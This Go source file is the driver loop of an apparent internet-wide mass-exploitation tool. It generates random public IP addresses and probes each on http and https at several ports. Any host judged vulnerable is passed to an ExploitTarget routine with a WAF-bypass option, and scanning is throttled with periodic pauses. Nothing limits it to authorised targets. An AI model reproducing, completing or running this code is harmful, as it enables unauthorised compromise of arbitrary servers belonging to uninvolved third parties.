package scanner

import (
	"VULN-R2S-GLO/config"
	"VULN-R2S-GLO/utils"
	"context"
	"fmt"
	"sync"
	"time"
)

func Run(ctx context.Context, cfg *config.Config) {
	sem := make(chan struct{}, cfg.MaxConcurrent)
	endTime := time.Now().Add(time.Duration(cfg.ScanHours) * time.Hour)

	var wg sync.WaitGroup

	for time.Now().Before(endTime) {
		select {
		case <-ctx.Done():
			utils.LogWarn("Shutting down scanner...")
			return
		default:
		}

		ip := GenerateRandomPublicIP()
		for _, proto := range []string{"http", "https"} {
			for _, port := range []string{"", ":3000", ":8080"} {
				url := fmt.Sprintf("%s://%s%s", proto, ip, port)

				// Pause every N requests
				if GetScanned()%int64(cfg.PauseInterval) == 0 && GetScanned() > 0 {
					utils.LogInfo(fmt.Sprintf("⏸️ Pausing %v after %d scans...", cfg.PauseDuration, GetScanned()))
					time.Sleep(cfg.PauseDuration)
				}

				wg.Add(1)
				go func(u, i string) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					if IsVulnerableSafe(u) {
						ExploitTarget(u, i, true, cfg.WAFBypassKB)
					}
					IncScanned()
				}(url, ip)
			}
		}

		time.Sleep(1 * time.Millisecond)
	}

	wg.Wait()
	utils.LogInfo(fmt.Sprintf("✅ Scan finished. Scanned: %d, Vulnerable: %d", GetScanned(), GetVulnerable()))
}
